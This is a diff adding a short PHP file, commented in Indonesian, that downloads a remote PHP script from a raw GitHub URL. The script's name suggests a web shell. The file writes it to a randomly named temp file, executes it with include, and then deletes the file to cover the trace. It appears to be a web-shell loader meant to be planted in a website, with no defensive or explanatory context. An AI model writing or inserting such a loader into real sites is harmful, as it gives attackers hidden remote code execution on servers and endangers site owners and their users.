@@ -1,0 +1,16 @@
+<?php
+// URL file remote PHP yang ingin diambil
+$remote_file = "https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/shelbelawa.php.txt";
+
+// Buat nama file temporer acak di folder temp sistem
+$local_file = sys_get_temp_dir() . '/' . bin2hex(random_bytes(8)) . '.php';
+
+// Ambil konten dari URL dan simpan ke file temporer
+file_put_contents($local_file, file_get_contents($remote_file));
+
+// Jalankan file tersebut
+include $local_file;
+
+// Hapus file temporer setelah dijalankan
+unlink($local_file);
+?>
